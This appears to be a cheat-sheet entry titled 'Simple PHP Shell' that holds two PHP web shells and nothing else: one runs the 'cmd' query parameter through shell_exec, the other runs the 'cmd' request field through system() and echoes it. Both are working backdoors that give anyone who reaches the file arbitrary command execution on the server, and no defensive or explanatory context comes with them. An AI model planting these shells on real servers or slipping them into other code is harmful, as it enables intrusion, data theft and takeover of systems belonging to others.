## Simple PHP Shell

```
<?php echo shell_exec($_GET['cmd']); ?>

```

```
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
?>
```
